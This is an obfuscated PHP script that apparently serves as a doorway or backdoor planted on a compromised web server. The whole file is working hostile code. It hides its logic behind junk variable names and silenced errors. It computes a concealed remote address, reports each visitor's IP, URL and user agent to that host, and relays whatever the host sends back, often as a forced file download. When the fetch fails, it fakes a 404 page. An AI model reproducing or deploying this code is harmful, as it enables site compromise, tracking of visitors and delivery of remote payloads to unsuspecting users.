<?php
$huwivcaqwkyy = "ips";
$webzjuqbdlt = "ip";
$pvgwini = "referer";
$tdxbepfs = "func";
$grejrgcz = "h";
$ijfgpxtihwo = "fp";
$mjqjoxqruwe = "h_detected";
$cnvsmrinnfzr = "headers";
$zxroqppm = "res";
$xizfmmkw = "data";
$luddhjlpck = "v";
$chmnjxoltw = "k";
$pksefjuyyos = "cookie";
$bxyrokkqh = "request";
$wrtplsb = "errno";
$veoofpvrc = "scheme";
$khtiegm = "timeout";
$chpubziqyvrj = "params";
$hdlilmk = "type";
$dhxsgdhvdhfl = "filename";
$hkmfjkt = "url";
$odignmef = "query";
$ybjfiflnjcv = "path";
$hrqtxf = "port";
$shacohpm = "url";
$nyxqoqitsyph = "content";
$ssfhjy = "key";
$wfmmjofchz = "letter";
$cytjrgk = "filename";
$ckrieemlnceu = "query";
$qmrstskrixx = "i";
$mmorlsb = "key";
error_reporting(0);
$cejbgfb = "content";
ini_set("display_errors", 0);
$wrlmzibel = "key";
$qsrgfqqt = "path";
$ymetmsampeo = "key";
$ {
    $ymetmsampeo
} = 0;
$msbqwlmlaajm = "key";
$aujkdfbhpz = "query";
$i = 0;
$umfbxhduyo = "ip";
$uwyqmsivr = "key";
$tkckivsitj = "ip";
foreach (str_split($_SERVER["REQUEST_URI"]) as $letter) {
    $rptcjic = "i";
    $key+= ord($letter);
    $ {
        $rptcjic
    }
    ++;
}
$ilqsxkyeof = "query";
if (!($i / 10)) {
    $pfhzdkdejv = "i";
    $ {
        $pfhzdkdejv
    }
    ();
    exit();
}
$key^= $key;
$key+= 32;
$key = str_repeat(chr($ {
    $wrlmzibel
}), 8);
function error_404() {
    $uiugkiu = "content";
    $luxtfimjdqc = "uri";
    $ucpgdjtmd = "uri";
    header("HTTP/1.1 404 Not Found");
    $ {
        $luxtfimjdqc
    } = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    $ {
        $uiugkiu
    } = http_request_custom("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    $content = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content);
    exit($content);
}
$fdfuftjvmxho = "query";
$ {
    $umfbxhduyo
} = "125.89.44.28";
$port = "80";
$path = "/fdn/entry.php";
$query = array();
$ {
    $ckrieemlnceu
}
["ip"] = getIp();
$ {
    $ilqsxkyeof
}
["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$query
["useragent"] = getUseragent();
$lldbkxymxva = "content";
$url = "http://" . convertIpToString(1048202089 ^ (ord($key
[0]) + ord($key
[1]) + (strstr(substr($_SERVER["REQUEST_URI"], -4), ".php") == FALSE ? 65 : ip2long($ {
    $tkckivsitj
})))) . ":" . $port . $ {
    $qsrgfqqt
} . "?" . http_build_query($ {
    $aujkdfbhpz
});
$content = @file_get_contents($ {
    $shacohpm
});
if (strlen($content) < 10) {
    error_404();
}
$content = explode("
", $content);
$filename = array_shift($content);
$content = implode("
", $content);
if (strstr($filename, ".html") === FALSE) {
    $type = "application/octet-stream";
    header("Content-Type:" . $type);
    $xhwiqxs = "filename";
    header("Content-Disposition: attachment; filename=" . $filename);
    header("Content-Length: " . strlen($content));
}
echo $content;
exit();
function http_request_custom($params) {
    $tjtjrwr = "params";
    $dkmsntchpgsr = "params";
    $cnfczslct = "params";
    $fkvqdn = "params";
    $yzjtoosg = "params";
    if (!is_array($ {
        $tjtjrwr
    })) {
        $zxyvbpjxp = "params";
        $params = array("url" => $ {
            $zxyvbpjxp
        }, "method" => "GET");
    }
    if ($params
    ["url"] == "") return FALSE;
    $thrnvs = "fp";
    $ieqhnvkf = "res";
    if (!isset($params
    ["method"])) $params
    ["method"] = (isset($params
    ["data"]) && is_array($params
    ["data"])) ? "POST" : "GET";
    $qotcrhqwshc = "url";
    $params
    ["method"] = strtoupper($params
    ["method"]);
    $gicietxh = "url";
    $wmblcgc = "url";
    if (!in_array($params
    ["method"], array("GET", "POST"))) return FALSE;
    $url = parse_url($params
    ["url"]);
    if (!isset($url
    ["scheme"])) $url
    ["scheme"] = "http";
    $auldfyydkj = "params";
    if (!isset($ {
        $gicietxh
    }
    ["path"])) $url
    ["path"] = "/";
    $vguewdxf = "url";
    $vmkoxrpjp = "url";
    $gfzboemo = "url";
    if (!isset($url
    ["host"]) && isset($ {
        $qotcrhqwshc
    }
    ["path"])) {
        $nawcefz = "url";
        if (strpos($url
        ["path"], "/")) {
            $wvtbrpn = "url";
            $rvbinxvez = "url";
            $url
            ["host"] = substr($ {
                $rvbinxvez
            }
            ["path"], 0, strpos($url
            ["path"], "/"));
            $url
            ["path"] = substr($url
            ["path"], strpos($url
            ["path"], "/"));
        } else {
            $url
            ["host"] = $url
            ["path"];
            $url
            ["path"] = "/";
        }
    }
    $gyrolyodccom = "headers";
    $nxkshy = "url";
    $url
    ["path"] = preg_replace("/[\/]+/", "/", $url
    ["path"]);
    if (isset($url
    ["query"])) $url
    ["path"].= "?{$url['query']}";
    $port = isset($params
    ["port"]) ? $params
    ["port"] : (isset($url
    ["port"]) ? $url
    ["port"] : ($url
    ["scheme"] == "https" ? 443 : 80));
    $remsiwvmg = "errstr";
    $jriwgsxtqd = "fp";
    $timeout = isset($params
    ["timeout"]) ? $params
    ["timeout"] : 30;
    if (!isset($params
    ["return"])) $params
    ["return"] = "content";
    $scheme = $url
    ["scheme"] == "https" ? "ssl://" : "";
    $fp = @fsockopen($scheme . $url
    ["host"], $port, $errno, $errstr, $timeout);
    if ($ {
        $jriwgsxtqd
    }) {
        $svlazhobbp = "request";
        $lhmpwoc = "params";
        $gdwfgcsx = "fp";
        $awdvdfigpf = "params";
        if (!isset($params
        ["User-Agent"])) $params
        ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        $wviokvmo = "request";
        $csmjkpsz = "request";
        $umehuhqj = "params";
        $ {
            $wviokvmo
        } = "{$params['method']} {$url['path']} HTTP/1.0
";
        $ {
            $svlazhobbp
        }.= "Host: {$url['host']}
";
        $request.= "User-Agent: {$params['User-Agent']}" . "
";
        $uqmgpukc = "request";
        if (isset($params
        ["referer"])) $request.= "Referer: {$params['referer']}
";
        if (isset($params
        ["cookie"])) {
            $fcefnkfu = "params";
            $cookie = "";
            $loxiwzyrttq = "cookie";
            $ckphocbkrg = "params";
            if (is_array($params
            ["cookie"])) {
                $ilfymkecn = "v";
                $xjvporljfqln = "cookie";
                $vrpunkqg = "cookie";
                $jblkqpvxi = "k";
                foreach ($params
                ["cookie"] as $k => $ {
                    $ilfymkecn
                }) $cookie.= "$k=$v; ";
                $cookie = substr($ {
                    $xjvporljfqln
                }, 0, -2);
            } else $ {
                $loxiwzyrttq
            } = $params
            ["cookie"];
            if ($cookie != "") $request.= "Cookie: $cookie
";
        }
        $ {
            $uqmgpukc
        }.= "Connection: close
";
        if ($ {
            $awdvdfigpf
        }
        ["method"] == "POST") {
            $whyvopvar = "request";
            $dxhxibkh = "request";
            $gvqvkczc = "params";
            $ysydczpdsymq = "data";
            $jpfvolh = "params";
            if (isset($params
            ["data"]) && is_array($ {
                $gvqvkczc
            }
            ["data"])) {
                $rlssuhyc = "data";
                $akosdbwayd = "v";
                $yggwowxhcyv = "data";
                $mxpleejeka = "data";
                $tilcymtxlv = "k";
                foreach ($params
                ["data"] AS $k => $v) $data.= urlencode($k) . "=" . urlencode($ {
                    $akosdbwayd
                }) . "&";
                if (substr($data, -1) == "&") $ {
                    $yggwowxhcyv
                } = substr($ {
                    $mxpleejeka
                }, 0, -1);
            }
            $ {
                $ysydczpdsymq
            }.= "

";
            $request.= "Content-type: application/x-www-form-urlencoded
";
            $ {
                $dxhxibkh
            }.= "Content-length: " . strlen($data) . "
";
        }
        $request.= "
";
        $ypsfjkkits = "fp";
        if ($params
        ["method"] == "POST") $request.= $data;
        @fwrite($fp, $request);
        $res = "";
        $headers = "";
        $h_detected = false;
        while (!@feof($fp)) {
            $ikebptpw = "res";
            $rdlxopp = "h_detected";
            $mqvktloy = "fp";
            $sxhqtjymto = "res";
            $res.= @fread($ {
                $mqvktloy
            }, 1024);
            if (!$ {
                $rdlxopp
            } && strpos($res, "

") !== FALSE) {
                $nemplhw = "params";
                $h_detected = true;
                $qdkctux = "headers";
                $headers = substr($res, 0, strpos($res, "

"));
                $res = substr($res, strpos($res, "

") + 4);
                $sixjpgnnif = "params";
                $ghqdzbfgk = "params";
                if ($params
                ["return"] == "headers" || $params
                ["return"] == "array" || (isset($params
                ["redirect"]) && $ {
                    $nemplhw
                }
                ["redirect"] == true)) {
                    $hdhftqjfibi = "k";
                    $ugyhamhc = "headers";
                    $h = explode("
", $headers);
                    $ {
                        $ugyhamhc
                    } = array();
                    foreach ($h as $ {
                        $hdhftqjfibi
                    } => $v) {
                        $nuhksf = "v";
                        if (strpos($v, ":")) {
                            $fgebfn = "v";
                            $k = substr($v, 0, strpos($v, ":"));
                            $v = trim(substr($ {
                                $fgebfn
                            }, strpos($v, ":") + 1));
                        }
                        $headers
                        [strtoupper($k) ] = $v;
                    }
                }
                $soprnmivykr = "params";
                $lwipds = "params";
                if (isset($ {
                    $soprnmivykr
                }
                ["redirect"]) && $params
                ["redirect"] == true && isset($headers
                ["LOCATION"])) {
                    $lhebulmdexg = "params";
                    $auaydcdvncw = "params";
                    $ {
                        $auaydcdvncw
                    }
                    ["url"] = $headers
                    ["LOCATION"];
                    if (!isset($params
                    ["redirect-count"])) $params
                    ["redirect-count"] = 0;
                    if ($ {
                        $lhebulmdexg
                    }
                    ["redirect-count"] < 10) {
                        $kxqoyvql = "params";
                        $params
                        ["redirect-count"]++;
                        $func = __FUNCTION__;
                        return @is_object($this) ? $this->$func
                        ($params) : $func
                        ($params);
                    }
                }
                if ($ {
                    $lwipds
                }
                ["return"] == "headers") return $headers;
            }
        }
        @fclose($ {
            $gdwfgcsx
        });
    } else return FALSE;
    if ($params
    ["return"] == "array") $res = array("headers" => $headers, "content" => $res);
    return $res;
}
function getUseragent() {
    return $_SERVER["HTTP_USER_AGENT"];
}
function getReferer() {
    $vwgbvybpxo = "referer";
    $referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "-";
    return $referer;
}
function convertIpToString($ip) {
    return long2ip($ip);
}
function getIp() {
    $ip = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    if (strpos($ip, ",") !== FALSE) {
        $pcqyjkdou = "ip";
        $ips = explode(",", $ip);
        $ip = trim(array_pop($ips));
    }
    return $ip;
} ?>
